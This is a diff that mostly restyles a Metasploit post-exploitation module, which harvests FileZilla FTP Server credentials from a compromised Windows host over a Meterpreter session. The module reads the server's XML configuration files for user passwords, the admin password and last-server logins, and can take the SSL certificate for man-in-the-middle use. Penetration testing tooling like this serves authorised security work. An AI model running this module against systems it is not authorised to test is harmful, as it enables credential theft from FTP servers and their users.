@@ -11,20 +11,23 @@ class Metasploit3 < Msf::Post
 
   include Msf::Post::File
 
-  def initialize(info={})
+  def initialize(info = {})
     super( update_info(info,
       'Name'           => 'Windows Gather FileZilla FTP Server Credential Collection',
       'Description'    => %q{ This module will collect credentials from the FileZilla FTP server if installed. },
       'License'        => MSF_LICENSE,
-      'Author'         => ['bannedit'],
+      'Author'         =>
+        [
+          'bannedit',  # original idea & module
+          'g0tmi1k'    # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features
+        ],
       'Platform'       => ['win'],
       'SessionTypes'   => ['meterpreter' ]
     ))
 
-    register_options(
-      [
-        OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM
-      ], self.class)
+    register_options([
+      OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM
+    ], self.class)
   end
 
 
@@ -37,7 +40,7 @@ class Metasploit3 < Msf::Post
     @progs = "#{session.sys.config.getenv('ProgramFiles')}\\"
 
     filezilla = check_filezilla
-    get_filezilla_creds(filezilla) if filezilla != nil
+    get_filezilla_creds(filezilla) if filezilla
   end
 
 
@@ -55,18 +58,18 @@ class Metasploit3 < Msf::Post
     end
 
     session.fs.dir.foreach(path) do |fdir|
-      ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do|xmlfile|
-        if fdir.eql? xmlfile
-          pathtmp = File.join(path + xmlfile)
-          vprint_status("Configuration File Found: %s" % pathtmp)
-          paths << pathtmp
+      ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do |xmlfile|
+        if fdir == xmlfile
+          filepath = path + xmlfile
+          vprint_status("Configuration file found: #{filepath}")
+          paths << filepath
         end
       end
     end
 
     if !paths.empty?
       print_good("Found FileZilla Server on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
-      print_line("")
+      print_line
       return paths
     end
 
@@ -110,9 +113,9 @@ class Metasploit3 < Msf::Post
     ])
 
     configuration = Rex::Ui::Text::Table.new(
-    'Header'    => "FileZilla FTP Server Configuration",
-    'Indent'    => 1,
-    'Columns'   =>
+    'Header'      => "FileZilla FTP Server Configuration",
+    'Indent'      => 1,
+    'Columns'     =>
     [
       "FTP Port",
       "FTP Bind IP",
@@ -125,9 +128,9 @@ class Metasploit3 < Msf::Post
     ])
 
     lastserver = Rex::Ui::Text::Table.new(
-    'Header'    => "FileZilla FTP Last Server",
-    'Indent'    => 1,
-    'Columns'   =>
+    'Header'   => "FileZilla FTP Last Server",
+    'Indent'   => 1,
+    'Columns'  =>
     [
       "IP",
       "Port",
@@ -135,7 +138,7 @@ class Metasploit3 < Msf::Post
     ])
 
 
-    paths.each do|path|
+    paths.each do |path|
       file = session.fs.file.new(path, "rb")
       until file.eof?
         if path.include? "FileZilla Server.xml"
@@ -190,8 +193,9 @@ class Metasploit3 < Msf::Post
     end
 
     perms.each do |perm|
-      permissions << [perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'], perm['filedelete'], perm['fileappend'],
-        perm['dircreate'], perm['dirdelete'], perm['dirlist'], perm['dirsubdirs'], perm['autocreate'], perm['home']]
+      permissions << [perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'],
+        perm['filedelete'], perm['fileappend'], perm['dircreate'], perm['dirdelete'], perm['dirlist'],
+        perm['dirsubdirs'], perm['autocreate'], perm['home']]
     end
 
     session.db_record ? (source_id = session.db_record.id) : (source_id = nil)
@@ -234,26 +238,26 @@ class Metasploit3 < Msf::Post
       login = create_credential_login(login_data)
     end
 
-    vprint_status("       FTP Port: %s" % config['ftp_port'])
-    vprint_status("    FTP Bind IP: %s" % config['ftp_bindip'])
-    vprint_status("            SSL: %s" % config['ssl'])
-    vprint_status("     Admin Port: %s" % config['admin_port'])
-    vprint_status("  Admin Bind IP: %s" % config['admin_bindip'])
-    vprint_status("     Admin Pass: %s" % config['admin_pass'])
-    vprint_line("")
+    vprint_status("       FTP Port: #{config['ftp_port']}")
+    vprint_status("    FTP Bind IP: #{config['ftp_bindip']}")
+    vprint_status("            SSL: #{config['ssl']}")
+    vprint_status("     Admin Port: #{config['admin_port']}")
+    vprint_status("  Admin Bind IP: #{config['admin_bindip']}")
+    vprint_status("     Admin Pass: #{config['admin_pass']}")
+    vprint_line
 
-    configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'], config['admin_pass'],
-      config['ssl'], config['ssl_certfile'], config['ssl_keypass']]
+    configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'],
+      config['admin_pass'], config['ssl'], config['ssl_certfile'], config['ssl_keypass']]
 
 
     lastser = parse_interface(fsi_xml)
     lastserver << [lastser['ip'], lastser['port'], lastser['password']]
 
     vprint_status("Last Server Information:")
-    vprint_status("         IP: %s" % lastser['ip'])
-    vprint_status("       Port: %s" % lastser['port'])
-    vprint_status("   Password: %s" % lastser['password'])
-    vprint_line("")
+    vprint_status("         IP: #{lastser['ip']}")
+    vprint_status("       Port: #{lastser['port']}")
+    vprint_status("   Password: #{lastser['password']}")
+    vprint_line
 
     p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
       "filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
@@ -271,7 +275,7 @@ class Metasploit3 < Msf::Post
       "filezilla_server_lastserver.csv", "FileZilla FTP Last Server")
     print_status(" Last server history: #{p.to_s}")
 
-    print_line("")
+    print_line
   end
 
 
@@ -303,11 +307,19 @@ class Metasploit3 < Msf::Post
     settings['ssl']        = opt[42].text rescue ""
 
     # empty means localhost only * is 0.0.0.0
-    settings['local_host'] ? (settings['admin_bindip'] = settings['local_host']) : (settings['admin_bindip'] = "127.0.0.1")
-    settings['admin_bindip'] = "0.0.0.0" if settings['admin_bindip'] == "*" or settings['admin_bindip'].empty?
+    if settings['local_host']
+      settings['admin_bindip'] = settings['local_host']
+    else
+      settings['admin_bindip'] = "127.0.0.1"
+    end
+    settings['admin_bindip'] = "0.0.0.0" if settings['admin_bindip'] == "*" || settings['admin_bindip'].empty?
 
-    settings['bindip'] ? (settings['ftp_bindip'] = settings['bindip']) : (settings['ftp_bindip'] = "127.0.0.1")
-    settings['ftp_bindip'] = "0.0.0.0" if settings['ftp_bindip'] == "*" or settings['ftp_bindip'].empty?
+    if settings['bindip']
+      settings['ftp_bindip'] = settings['bindip']
+    else
+      settings['ftp_bindip'] = "127.0.0.1"
+    end
+    settings['ftp_bindip'] = "0.0.0.0" if settings['ftp_bindip'] == "*" || settings['ftp_bindip'].empty?
 
     if settings['ssl'] == "1"
       settings['ssl'] = "true"
@@ -319,7 +331,7 @@ class Metasploit3 < Msf::Post
     end
 
     settings['ssl_certfile'] = items[45].text rescue "<none>"
-    if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT']   # lets get the file if its there could be useful in MITM attacks
+    if settings['ssl_certfile'] != "<none>" and settings['ssl'] == "true" and datastore['SSLCERT'] # lets get the file if its there could be useful in MITM attacks
       sslfile = session.fs.file.new(settings['ssl_certfile'])
       until sslfile.eof?
         sslcert << sslfile.read
@@ -334,7 +346,7 @@ class Metasploit3 < Msf::Post
     settings['ssl_keypass'] = items[50].text rescue "<none>"
     settings['ssl_keypass'] = "<none>" if settings['ssl_keypass'].nil?
 
-    vprint_status("Collected the following credentials:") if !doc.elements['Users'].nil?
+    vprint_status("Collected the following credentials:") if doc.elements['Users']
 
     doc.elements.each("Users/User") do |user|
       account = {}
@@ -377,20 +389,20 @@ class Metasploit3 < Msf::Post
       account['ssl']  = settings['ssl']
       creds << account
 
-      vprint_status("    Username: %s" % account['user'])
-      vprint_status("    Password: %s" % account['password'])
-      vprint_status("       Group: %s" % account['group']) if account['group'] != nil
-      vprint_line("")
+      vprint_status("    Username: #{account['user']}")
+      vprint_status("    Password: #{account['password']}")
+      vprint_status("       Group: #{account['group']}") if account['group']
+      vprint_line
     end
 
     # Rather than printing out all the values, just count up
     groups = groups.uniq unless groups.uniq.nil?
     if !datastore['VERBOSE']
       print_status("Collected the following credentials:")
-      print_status("    Usernames: %u" % users)
-      print_status("    Passwords: %u" % passwords)
-      print_status("       Groups: %u" % groups.length)
-      print_line("")
+      print_status("    Usernames: #{users}")
+      print_status("    Passwords: #{passwords}")
+      print_status("       Groups: #{groups.length}")
+      print_line
     end
     return [creds, perms, settings]
   end
@@ -411,21 +423,18 @@ class Metasploit3 < Msf::Post
     lastser['port']     = opt[1].text rescue "<none>"
     lastser['password'] = opt[2].text rescue "<none>"
 
-    lastser['password'] = "<none>" if lastser['password'] == nil
+    lastser['password'] = "<none>" if lastser['password'].nil?
 
-    return lastser
+    lastser
   end
 
 
   def got_root?
-    if session.sys.config.getuid =~ /SYSTEM/
-      return true
-    end
-    return false
+    session.sys.config.getuid =~ /SYSTEM/ ? true : false
   end
 
 
   def whoami
-    return session.sys.config.getenv('USERNAME')
+    session.sys.config.getenv('USERNAME')
   end
 end
